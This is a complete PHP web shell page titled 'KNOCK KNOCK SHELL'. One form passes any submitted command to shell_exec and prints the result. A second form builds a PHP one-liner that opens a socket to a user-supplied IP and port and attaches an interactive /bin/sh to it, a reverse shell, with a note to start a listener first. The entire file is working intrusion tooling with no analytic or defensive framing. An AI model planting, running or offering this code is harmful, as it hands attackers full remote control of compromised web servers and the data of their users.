<?php 
?>
<body style="background-color:rgb(200,200,200);">
    <form action="<?php $link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; echo "{$link}"?>" method="POST">
    <center>
        <strong>
        </br>
        <h1 color="rgb(255, 0, 31)"><b>KNOCK KNOCK</b></h1>
        </br>
        <h2 color="rgb(255, 0, 31)"><b>SHELL</b></h2>
            COMMAND : <input type="text" name="cmd" value=""/>
            <input type="submit" name="submit" value="CMD" />
        </br></br>
        <h2 color="rgb(255, 0, 31)"><b>R SHELL USING PHP</b></h2>
        <p><b><i>*NOTE : </b>Before triggring rshell, start listening</i></p>
        </br>
        IP : <input type="text" name="ip" value=""/>&nbsp;PORT : <input type="text" name="port" value=""/>
        <input type="submit" name="submit" value="R SHELL" />
        </strong>
    </center>
    <br />
    <strong>
    <font size="5"> 
        <?php
        if(isset($_POST["cmd"])){
            $cmd=$_POST["cmd"];
            $output = shell_exec("{$cmd} 2>&1");
            echo $cmd."</br>"."<pre>".$output."</pre>";
        }
        if (isset($_POST["ip"]) && isset($_POST["port"])) {
            $sock="sock";
            $cmd = "php -r '$"."{$sock}"."=fsockopen("."\"{$_POST["ip"]}\"".","."{$_POST["port"]}".");shell_exec(\""."/bin/sh -i <&3 >&3 2>&3"."\");'";
            if (strlen($cmd)>66) {
                shell_exec("{$cmd} 2>&1");
            }
        }
        ?>
    </font>
    </strong>
</body>